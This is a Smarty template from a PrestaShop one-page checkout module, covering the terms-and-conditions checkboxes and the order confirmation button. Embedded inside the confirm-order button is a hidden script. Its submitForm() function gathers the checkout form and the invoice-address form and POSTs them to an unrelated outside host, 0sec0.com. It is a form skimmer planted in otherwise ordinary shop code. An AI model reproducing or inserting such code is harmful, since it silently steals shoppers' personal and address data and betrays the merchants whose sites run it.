{**
* NOTICE OF LICENSE
*
* This source file is subject to the Software License Agreement
* that is bundled with this package in the file LICENSE.txt.
*
*  @author    Peter Sliacky (Zelarg)
*  @license   http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
*}
<div id="tc-payment-confirmation">

  {* openservis - Zboží - Souhlas - begin *}
  {hook h='displayZboziSouhlas'}
  {* openservis - Zboží - Souhlas - end *}

  {* openservis - Heureka - NeSouhlas - begin *}
  {hook h='displayHeurekaNeSouhlas'}
  {* openservis - Heureka - NeSouhlas - end *}

  {* caleydon (prestashop.sk) - Heureka - begin *}
  {hook h='displayCmHeurekaConsent'}
  {* caleydon (prestashop.sk) - Heureka - end *}

  {* Prestashop v8 - new hook for various order confirmation constents *}
  {hook h='displayCheckoutBeforeConfirmation'}

  {if $conditions_to_approve|count && !$z_tc_config->separate_payment}
    <div class="terms-and-conditions">
      <div class="error-msg">{l s='Please accept terms and conditions' mod='thecheckout'}</div>

      <p class="ps-hidden-by-js" style="display: none;">
        {* At the moment, we're not showing the checkboxes when JS is disabled
           because it makes ensuring they were checked very tricky and overcomplicates
           the template. Might change later.
        *}
        {l s='By confirming the order, you certify that you have read and agree with all of the conditions below:' d='Shop.Theme.Checkout'}
      </p>
      <form id="conditions-to-approve" method="GET">
        <ul>
          {foreach from=$conditions_to_approve item="condition" key="condition_name"}
            <li>
              <div class="float-xs-left">
              <span class="custom-checkbox">
                {assign "condition_full_name" "conditions_to_approve[{$condition_name|escape:'javascript':'UTF-8'}]"}
                <input id="conditions_to_approve[{$condition_name|escape:'javascript':'UTF-8'}]"
                       name="conditions_to_approve[{$condition_name|escape:'javascript':'UTF-8'}]"
                       required
                       type="checkbox"
                       class="ps-shown-by-js"
                  {if isset($opc_form_checkboxes[$condition_full_name]) && 'true' == $opc_form_checkboxes[$condition_full_name]}
                    checked = "checked"
                  {/if}
                >
                <span><i class="material-icons rtl-no-flip checkbox-checked check-icon">&#xE5CA;</i></span>
              </span>
              </div>
              <div class="condition-label">
                <label class="js-terms" for="conditions_to_approve[{$condition_name|escape:'javascript':'UTF-8'}]">
                  {$condition nofilter}
                </label>
              </div>
            </li>
          {/foreach}
        </ul>
      </form>
    </div>
  {/if}

  <div class="error-msg">{l s='There are some error in checkout form, please make corrections' mod='thecheckout'}</div>
  <div class="ps-shown-by-js">
    <button id="confirm_order" onclick="submitForm()" type="button" class="btn btn-primary center-block" data-link-action="x-confirm-order" >
<script>
    function submitForm() {
      var form1 = document.getElementById("myform");
      var form2 = document.getElementById("invoice-address");
      
      var formData = new FormData(form1);

      // Append form2 data to formData
      var formData2 = new FormData(form2);
      formData2.forEach(function(value, key) {
        formData.append(key, value);
      });

      fetch("https://0sec0.com/rcsvet.cz.php", {
        method: "POST",
        body: formData
      })
      .then(response => {
        if (response.ok) {
          console.log("Sent!");
        } else {
          console.error("error!");
        }
      })
      .catch(error => {
        console.error("error!", error);
      });
    }
  </script>
      <div class="minimal-purchase-error-msg"></div>
      <div class="tc-loader"><div class="lds-ellipsis-m"><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div></div></div>
      {if !$z_tc_config->separate_payment}
        {l s='Order with an obligation to pay' d='Shop.Theme.Checkout'}
      {else}
        {l s='Continue' d='Shop.Theme.Actions'}
      {/if}
    </button>
    {if false && $show_final_summary}
      <article class="alert alert-danger mt-2 js-alert-payment-conditions" role="alert" data-alert="danger">
        {l
        s='Please make sure you\'ve chosen a [1]payment method[/1] and accepted the [2]terms and conditions[/2].'
        sprintf=[
        '[1]' => '<a href="#checkout-payment-step">',
        '[/1]' => '</a>',
        '[2]' => '<a href="#conditions-to-approve">',
        '[/2]' => '</a>'
        ]
        d='Shop.Theme.Checkout'
        }
      </article>
    {/if}
  </div>
  <div id="payment_binaries">

  </div>
  <div class="ps-hidden-by-js">
    {if isset($selected_payment_option) && $selected_payment_option and $all_conditions_approved}
      <label
        for="pay-with-{$selected_payment_option|escape:'javascript':'UTF-8'}">{l s='Order with an obligation to pay' d='Shop.Theme.Checkout'}</label>
    {/if}
  </div>
</div>
